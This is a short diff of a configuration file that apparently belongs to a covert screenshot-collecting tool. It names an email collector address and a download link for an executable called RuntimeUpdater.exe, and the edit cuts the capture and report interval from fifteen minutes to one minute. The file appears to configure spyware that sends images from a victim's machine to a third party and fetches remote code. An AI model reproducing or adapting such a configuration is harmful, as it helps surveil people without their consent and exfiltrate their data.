@@ -8,8 +8,8 @@ COLLECTOR=multihack.update@yandex.ru
 LINK=https://github.com/ZongerX/test/raw/master/RuntimeUpdater.exe
 LASTVERSION=1
 [TIMER]
-TIME=900000
-INTERVAL=900000
+TIME=60000
+INTERVAL=60000
 [IMAGE]
 COMPRESSION=100
 [FILE]
